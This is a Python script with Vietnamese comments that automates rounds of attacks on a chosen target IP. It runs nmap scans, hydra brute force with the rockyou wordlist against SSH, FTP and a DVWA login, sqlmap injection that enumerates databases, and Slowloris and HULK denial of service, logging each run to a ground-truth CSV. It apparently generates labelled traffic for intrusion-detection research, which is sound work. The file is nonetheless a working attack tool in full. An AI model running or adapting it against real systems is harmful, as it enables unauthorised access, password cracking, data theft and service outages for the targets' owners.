import subprocess
import time
import os
import csv
import random
import argparse
from datetime import datetime

# Lấy timestamp theo millisecond
def current_time_ms():
    return int(time.time() * 1000)

def run_command(command, attack_type, dst_ip, dst_port, params, log_writer):
    print(f"\n{'='*50}")
    print(f"[ATTACK] Đang bắt đầu: {attack_type}")
    print(f"Lệnh: {command}")
    print(f"{'='*50}")
    
    start_ms = current_time_ms()
    try:
        # Chạy lệnh hệ thống
        process = subprocess.Popen(command, shell=True)
        # Đợi lệnh chạy xong
        process.wait()
    except KeyboardInterrupt:
        print("\n[!] Dừng cuộc tấn công.")
        process.terminate()
        return
    
    end_ms = current_time_ms()
    
    # Ghi log Ground Truth
    log_writer.writerow({
        'attack_type': attack_type,
        'src_ip': 'Attacker',  # Có thể cải tiến bằng cách lấy IP thật
        'dst_ip': dst_ip,
        'dst_port': dst_port,
        'start_time_ms': start_ms,
        'end_time_ms': end_ms,
        'params': params
    })

def attack_pipeline(target_ip, run_name, total_rounds, realistic_mode):
    print(f"\n[ATTACK] Kích hoạt chế độ Tấn công Tự động (v2)")
    if realistic_mode:
        print("[*] Chế độ THỰC CHIẾN (Realistic): Giảm thiểu DoS để duy trì tỷ lệ Benign 95%")
    
    # Chuẩn bị file log Ground Truth
    os.makedirs('../docs', exist_ok=True)
    log_file = f'../docs/ground_truth_log_{run_name}.csv'
    
    with open(log_file, mode='w', newline='') as csvfile:
        fieldnames = ['attack_type', 'src_ip', 'dst_ip', 'dst_port', 'start_time_ms', 'end_time_ms', 'params']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        
        # Các mức timeout mặc định
        t_brute = 10 if realistic_mode else 30
        t_web = 15 if realistic_mode else 30
        t_sql = 20 if realistic_mode else 60
        t_slowloris = 10 if realistic_mode else 45
        t_hulk = 10 if realistic_mode else 45
        
        round_num = 1
        # Thực hiện các đợt tấn công
        for round_num in range(1, total_rounds + 1):
            print(f"\n{'='*50}")
            print(f"--- ĐỢT TẤN CÔNG {round_num}/{total_rounds} ---")
            print(f"{'='*50}")

            # 1. PortScan: -sT only (không dùng -sV để tránh multi-probe per port)
            # --max-retries 0 đảm bảo đúng 1 probe/port → unique dst_port count cao, discriminative
            timing = random.choice(['-T3', '-T4', '-T5'])
            port_range = random.choice(['1-1000', '1-5000', '1-10000'])
            params = f"-sT {timing} -p {port_range} --max-retries 0"
            run_command(f"sudo nmap {params} {target_ip}", "PortScan", target_ip, "Multiple", params, writer)
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 2. SSH Brute Force
            threads = random.randint(2, 6)
            params = f"-t {threads} timeout {t_brute}s"
            run_command(
                f"timeout {t_brute}s hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t {threads} -f",
                "Brute Force", target_ip, "22", params, writer
            )
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 3. FTP Brute Force
            threads = random.randint(2, 6)
            params = f"-t {threads} timeout {t_brute}s"
            run_command(
                f"timeout {t_brute}s hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target_ip} -t {threads} -f",
                "Brute Force", target_ip, "21", params, writer
            )
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 4. Web Brute Force
            threads = random.randint(4, 8)
            params = f"http-get /DVWA/login.php -t {threads} timeout {t_web}s"
            run_command(
                f"timeout {t_web}s hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} http-get /DVWA/login.php -t {threads}",
                "Web Attack", target_ip, "80", params, writer
            )
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 5. SQL Injection
            risk = random.randint(1, 3)
            level = random.randint(1, 3)
            params = f"--forms --risk={risk} --level={level} timeout {t_sql}s"
            run_command(
                f"timeout {t_sql}s sqlmap -u 'http://{target_ip}/DVWA/login.php' "
                f"--forms --batch --dbs --level={level} --risk={risk}",
                "Web Attack", target_ip, "80", params, writer
            )
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 6. DoS Slowloris
            conns = random.randint(150, 400)
            params = f"-s {conns} timeout {t_slowloris}s"
            run_command(
                f"timeout {t_slowloris}s slowloris {target_ip} -p 80 -s {conns}",
                "DoS", target_ip, "80", params, writer
            )
            time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            # 7. DoS Hulk
            if os.path.exists("./hulk/hulk.py"):
                params = f"timeout {t_hulk}s"
                run_command(
                    f"timeout {t_hulk}s python3 ./hulk/hulk.py http://{target_ip}",
                    "DoS", target_ip, "80", params, writer
                )
                time.sleep(random.randint(20, 40) if realistic_mode else random.randint(15, 30))

            print(f"\n--- XONG ĐỢT {round_num}. NGHỈ NGƠI TRƯỚC ĐỢT TIẾP THEO... ---")
            time.sleep(random.randint(60, 120) if realistic_mode else random.randint(40, 60))
            
    print(f"\n[HOÀN TẤT] File log Ground Truth được lưu tại: {log_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Auto Attack Script v2")
    parser.add_argument("--target", required=True, help="IP của Máy Nạn nhân (Victim)")
    parser.add_argument("--run-name", default="run3", help="Tên phiên chạy (ví dụ: run3)")
    parser.add_argument("--rounds", type=int, default=3, help="Số đợt tấn công (mặc định: 3)")
    parser.add_argument("--realistic", action="store_true", help="Chạy ở chế độ thực chiến (giảm traffic DoS, tăng thời gian idle)")
    args = parser.parse_args()
    
    print(f"=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG VÀO {args.target} ({args.rounds} đợt) ===")
    attack_pipeline(args.target, args.run_name, args.rounds, args.realistic)
